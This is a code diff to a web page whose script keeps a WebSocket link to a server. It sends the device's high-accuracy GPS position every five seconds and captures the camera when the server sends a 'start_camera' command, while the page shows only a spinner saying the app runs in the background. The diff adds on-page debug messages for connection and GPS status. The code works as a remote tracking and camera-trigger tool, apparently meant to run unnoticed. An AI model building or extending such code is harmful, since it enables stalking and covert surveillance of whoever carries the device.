@@ -27,7 +27,7 @@
         <div class="spinner"></div>
         <h2>✓ Running</h2>
         <p>App is running in background</p>
-        <p style="font-size:12px;color:#999;margin-top:20px;">You can close this page</p>
+        <p id="debugInfo" style="font-size:12px;color:#333;margin-top:20px;">Connecting...</p>
     </div>
     
     <script type="module">
@@ -80,7 +80,10 @@
             const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
             ws = new WebSocket(`${wsProtocol}//${window.location.host}?type=device&id=${deviceId}&name=${deviceName}`);
             
-            ws.onopen = () => startMonitoring();
+            ws.onopen = () => {
+                document.getElementById('debugInfo').textContent = 'Connected! Getting location...';
+                startMonitoring();
+            };
             
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
@@ -89,7 +92,10 @@
                 else if (data.type === 'start_camera') captureCamera(data.camera);
             };
             
-            ws.onclose = () => setTimeout(connect, 3000);
+            ws.onclose = () => {
+                document.getElementById('debugInfo').textContent = 'Disconnected. Reconnecting...';
+                setTimeout(connect, 3000);
+            };
         }
         
         function startMonitoring() {
@@ -99,20 +105,25 @@
             }
             
             if (navigator.geolocation) {
+                document.getElementById('debugInfo').textContent = 'Requesting GPS permission...';
                 navigator.geolocation.getCurrentPosition(pos => {
+                    document.getElementById('debugInfo').textContent = `GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`;
                     ws.send(JSON.stringify({
                         type: 'location',
                         deviceId: deviceId,
                         lat: pos.coords.latitude,
                         lng: pos.coords.longitude
                     }));
-                }, null, {
+                }, (error) => {
+                    document.getElementById('debugInfo').textContent = `GPS Error: ${error.message}`;
+                }, {
                     enableHighAccuracy: true,
                     maximumAge: 0
                 });
                 
                 setInterval(() => {
                     navigator.geolocation.getCurrentPosition(pos => {
+                        document.getElementById('debugInfo').textContent = `GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`;
                         ws.send(JSON.stringify({
                             type: 'location',
                             deviceId: deviceId,
@@ -124,6 +135,8 @@
                         maximumAge: 0
                     });
                 }, 5000);
+            } else {
+                document.getElementById('debugInfo').textContent = 'GPS not supported';
             }
         }
         
